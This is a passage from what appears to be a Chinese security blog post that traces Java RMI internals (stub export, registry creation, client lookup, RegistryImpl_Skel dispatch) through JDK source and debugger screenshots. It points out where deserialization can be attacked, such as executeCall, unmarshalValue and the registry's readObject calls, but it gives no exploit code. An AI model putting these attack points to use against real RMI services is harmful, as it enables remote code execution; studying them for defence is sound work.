class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">stubClassExists</span><span class="hljs-params">(Class&lt;?&gt; remoteClass)</span> &#123;<br>    <span class="hljs-comment">//先看缓存：withoutStubs 用来存放 “已经确定没有 Stub 的类”</span><br>    <span class="hljs-keyword">if</span> (!withoutStubs.containsKey(remoteClass)) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//尝试用 Class.forName 加载 [远程类名 + &quot;_Stub&quot;] 这个类</span><br>            Class.forName(remoteClass.getName() + <span class="hljs-string">&quot;_Stub&quot;</span>,<br>                          <span class="hljs-literal">false</span>,<br>                          remoteClass.getClassLoader());<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">//如果能加载成功，说明确实存在 Stub 类</span><br><br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException cnfe) &#123;<br>            <span class="hljs-comment">// 如果加载不到，说明这个远程类没有对应的 &quot;_Stub&quot;</span><br>            <span class="hljs-comment">//  那么就把它记到 withoutStubs 缓存里，下次查询就直接返回 false</span><br>            withoutStubs.put(remoteClass, <span class="hljs-literal">null</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">//如果缓存里已有，或者加载失败，就返回 false</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>如果要进入 createStub ，<strong>强制使用 Stub</strong><code>forceStubUse == true</code>，<strong>没有忽略 Stub 并且存在 Stub 类</strong><code>ignoreStubClasses == false``stubClassExists(remoteClass) == true</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056496.png"></p><p>下一步创建动态代理</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056087.png"></p><p>其中的 handler 存放 LiveRef@783</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056321.png"></p><p>这样就创建好了动态代理 <strong>stub</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057316.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057112.png"></p><p>进入 Target （实际上是将目前创建的东西都封装到一起）</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057390.png"></p><p><strong>客户端引用（stub）和服务端引用（disp）的 LiveRef 是一样的，</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057434.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057072.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057553.png"></p><p>接下来，将封装好的 target 发布出去</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057747.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057010.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058476.png"></p><p>跟到了 TCPTransport 类中的 exportObject</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058357.png"></p><p>listen() 函数先获取 <strong>TCPEndpoint@823</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250805468.png"></p><p>准备创建 ServerSocket</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058662.png"></p><p>判断 port 是否为 0，如果为 0 ，进入 setDefaultPort，设置端口号</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (listenPort == <span class="hljs-number">0</span>)<br>    setDefaultPort(server.getLocalPort(), csf, ssf);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058959.png"></p><p>进入 server.getLocalPort </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058480.png"></p><p>在这个函数中端口被赋值，此端口随机，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058618.png"></p><p>这个时候的端口被赋值为 55685</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250805487.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058891.png"></p><ul><li>doPrivileged： 表示即使调用栈上其他代码没有权限，也允许这里的操作按本方法的权限执行。 </li><li>NewThreadAction： 创建一个新的线程</li></ul><p>这个线程开启之后等待客户端的连接</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058990.png"></p><p>做完这些之后，用 MAP 表储存 target，target 中包括了 IP、端口、服务端代理、客户端代理等信息</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058314.png"></p><p>最后返回一些值，完成了服务端的发布过程。</p><p>到这里在返回看 <strong>exportObject 函数的作用</strong>：</p><ul><li>静态方法的 <font style="color:#080808;background-color:#ffffff;">exportObject 传入俩个参数，创建一个 UnicastServerRef 对象 sref ，sref 中封装了IP、端口等信息，核心是 LiveRef@xxx，然后调用 exportObject(obj, sref)</font></li><li><font style="color:#080808;background-color:#ffffff;">重载方法的 exportObject 返回代理对象 stub</font></li><li>这样就做到了把一个本地的远程对象实例导出成一个可以远程访问的对象</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058084.png"></p><h3 id="3-2-注册中心-创建注册中心-绑定"><a href="#3-2-注册中心-创建注册中心-绑定" class="headerlink" title="3.2 注册中心-创建注册中心+绑定"></a>3.2 注册中心-创建注册中心+绑定</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058089.png"></p><p>调用 createRegistry  创建注册中心，默认端口号为1099</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058574.png"></p><p>到了这一步点“恢复程序”，如果继续跟进去会发现一堆奇怪的东西</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059987.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250806502.png"></p><p>来到这一步：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059539.png"></p><p>创建了一个 LiveRef，一个 lref，（这里的作用和服务端的实际上是一样的）</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059580.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059524.png"></p><h3 id="3-3-客户端-请求注册中心"><a href="#3-3-客户端-请求注册中心" class="headerlink" title="3.3 客户端-请求注册中心"></a>3.3 客户端-请求注册中心</h3><p>首先连接注册中心，接收传入的IP和端口</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059631.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059585.png"></p><p>使用LIveRef ，将传入的 host,port,等封装</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059455.png"></p><p>再次调用 <font style="color:#080808;background-color:#ffffff;">createProxy 方法，同样的创建了 stub ，（这里的创建是通过注册中心传入参数（host,port..），客户端自行创建 stub）</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059526.png"></p><p>来到下一步：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250806495.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059518.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059247.png"></p><h4 id="问题：在动态调试时遇到报错，可能是服务端没有开启！"><a href="#问题：在动态调试时遇到报错，可能是服务端没有开启！" class="headerlink" title="问题：在动态调试时遇到报错，可能是服务端没有开启！"></a>问题：在动态调试时遇到报错，可能是服务端没有开启！</h4><p>下一步调用会报以下错误，因为服务端没有开启监听</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100821.png"></p><p>将 RMIServer 运行起来就可以了</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059422.png"></p><p>这里看到传进来的 var1 实际上就是<code>IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;remoteObj&quot;);</code>中的 <code>remoteObj</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100050.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Remote <span class="hljs-title function_">lookup</span><span class="hljs-params">(String var1)</span> <span class="hljs-keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//创建远程调用对象</span><br>        <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.ref.newCall(<span class="hljs-built_in">this</span>, operations, <span class="hljs-number">2</span>, <span class="hljs-number">4905912898345647071L</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//序列化参数，将 var1 写入输出流</span><br>            <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.getOutputStream();<br>            var3.writeObject(var1);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var18) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling arguments&quot;</span>, var18);<br>        &#125;<br><br>        <span class="hljs-comment">//发起远程调用，</span><br>        <span class="hljs-built_in">super</span>.ref.invoke(var2);<br><br>        Remote var23;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">///从输入流中读取远程 registry 返回的对象</span><br>            <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>            <span class="hljs-comment">//</span><br>            var23 = (Remote)var6.readObject();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var15) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var15);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var16) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var16);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-built_in">super</span>.ref.done(var2);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> var23;<br>    &#125; <span class="hljs-keyword">catch</span> (RuntimeException var19) &#123;<br>        <span class="hljs-keyword">throw</span> var19;<br>    &#125; <span class="hljs-keyword">catch</span> (RemoteException var20) &#123;<br>        <span class="hljs-keyword">throw</span> var20;<br>    &#125; <span class="hljs-keyword">catch</span> (NotBoundException var21) &#123;<br>        <span class="hljs-keyword">throw</span> var21;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception var22) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnexpectedException</span>(<span class="hljs-string">&quot;undeclared checked exception&quot;</span>, var22);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 <strong>invoke</strong></p><p><strong>super.ref.invoke(var2);</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100488.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100413.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100826.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100956.png"></p><p>StreamRemoteCall 类中的 executeCall 是真正处理网络请求的方法</p><p><strong>executeCall 中有一步通过反序列化处理异常，如果注册中心有恶意对象，客户端在此处反序列化时被攻击。</strong></p><p><strong>由于 executeCall 是客户端网络请求的必经之路，所以这个反序列化几乎不可避免</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100633.png"></p><p>这里的 lookup 方法的作用就是去注册中心查找远程对象</p><h3 id="3-4-客户端-请求服务端"><a href="#3-4-客户端-请求服务端" class="headerlink" title="3.4 客户端-请求服务端"></a>3.4 客户端-请求服务端</h3><p><strong>同样注意开启服务端</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100785.png"></p><p>来到了 invoke</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100700.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100902.png"></p><p>这里又跟到了 StreamRemoteCall ，这样的请求同样可以被攻击</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100629.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101578.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100270.png"></p><p>结束 <font style="color:#080808;background-color:#ffffff;">call.executeCall(); 后会出现另一个反序列化点</font></p><p>进入 <strong>unmarshalValue</strong> </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101064.png"></p><p><strong>unmarshalValue 函数的作用就是根据目标类型，选择正确的方式从输入流中读取数据</strong>。</p><ul><li>对基本类型，用专门的 <code>readxxx()</code> 方法读取，再返回</li><li>对对象类型，直接调用 <code>readObject()</code> 反序列化</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250807873.png"></p><p>returnValue 返回了 “HELLO”</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101630.png"></p><h4 id="总结-客户端产生的反序列化漏洞点"><a href="#总结-客户端产生的反序列化漏洞点" class="headerlink" title="总结-客户端产生的反序列化漏洞点"></a>总结-客户端产生的反序列化漏洞点</h4><ol><li>StreamRemoteCall.executeCall</li></ol><p>StreamRemoteCall 类中的 executeCall 是真正处理网络请求的方法</p><p><strong>executeCall 中有一步通过反序列化处理异常，如果注册中心有恶意对象，客户端在此处反序列化时被攻击。</strong></p><p><strong>由于 executeCall 是客户端网络请求的必经之路，所以这个反序列化几乎不可避免</strong></p><hr><p>executeCall 处理的协议就是<strong>JRMP 协议</strong></p><ol start="2"><li>unmarshalValue</li></ol><p>unmarshalValue 函数向服务端请求获取返回值时，返回值是通过反序列化产生的。</p><h3 id="3-5-注册中心-客户端请求时"><a href="#3-5-注册中心-客户端请求时" class="headerlink" title="3.5 注册中心-客户端请求时"></a>3.5 注册中心-客户端请求时</h3><p>前面说过，服务端创建了 stub 并将信息封装到 target，随后的 NewThreadAction 创建了一个新的线程，等待客户端的响应</p><blockquote><p>这个线程开启之后等待客户端的连接</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101934.png"></p></blockquote><p>现在进入创建线程的流程：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101994.png"></p><p>进入 run() 后，只能调用 <font style="color:#080808;background-color:#ffffff;">executeAcceptLoop，executeAcceptLoop 又创建了一个新的线程</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101732.png"></p><p>run 调用了 run0</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101959.png"></p><p>run0 前面都是在解析一些协议，重点是 <strong>handleMessages</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101134.png"></p><p>其中的 默认情况是调用了 serviceCall</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102514.png"></p><p>serviceCall 会从表中获取 target</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102601.png"></p><p>此处断点调试：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102239.png"></p><p>可以看到断点处的 stub 就是服务端创建好的东西</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102908.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102432.png"></p><p>之后会调用 disp.dispatch，disp 是一个分发器，用于将远程请求分发到服务端执行</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102528.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102834.png"></p><p>这里 skel 不为空就会调用 oldDispatch</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102594.png"></p><p><font style="color:#080808;background-color:#ffffff;">skel.dispatch</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102245.png"></p><p>而 <font style="color:#080808;background-color:#ffffff;">skel.dispatch 是属于 RegistryImpl_Skel 类中的 dispatch</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102876.png"></p><p>接下来就到了重点：</p><p><strong>RegistryImpl_Skel.class</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispatch</span><span class="hljs-params">(Remote var1, RemoteCall var2, <span class="hljs-type">int</span> var3, <span class="hljs-type">long</span> var4)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (var4 != <span class="hljs-number">4905912898345647071L</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SkeletonMismatchException</span>(<span class="hljs-string">&quot;interface hash mismatch&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">RegistryImpl</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> (RegistryImpl)var1;<br>        <span class="hljs-keyword">switch</span> (var3) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                String var100;<br>                Remote var103;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var105</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    var100 = (String)var105.readObject();<br>                    var103 = (Remote)var105.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var94) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var94);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var95) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var95);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.bind(var100, var103);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var93) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var93);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                var2.releaseInputStream();<br>                String[] var99 = var6.list();<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var102</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    var102.writeObject(var99);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var92) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var92);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                String var98;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var104</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    <span class="hljs-comment">//此处为注册中心，直接调用了反序列化</span><br>                    var98 = (String)var104.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var89) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var89);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var90) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var90);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                <span class="hljs-type">Remote</span> <span class="hljs-variable">var101</span> <span class="hljs-operator">=</span> var6.lookup(var98);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    var9.writeObject(var101);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var88) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var88);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                Remote var8;<br>                String var97;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var11</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    var97 = (String)var11.readObject();<br>                    var8 = (Remote)var11.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var85) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var85);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var86) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var86);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.rebind(var97, var8);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var84) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var84);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                String var7;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    var7 = (String)var10.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var81) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var81);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var82) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var82);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.unbind(var7);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var80) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var80);<br>                &#125;<br>            <span class="hljs-keyword">default</span>:<br>                <span 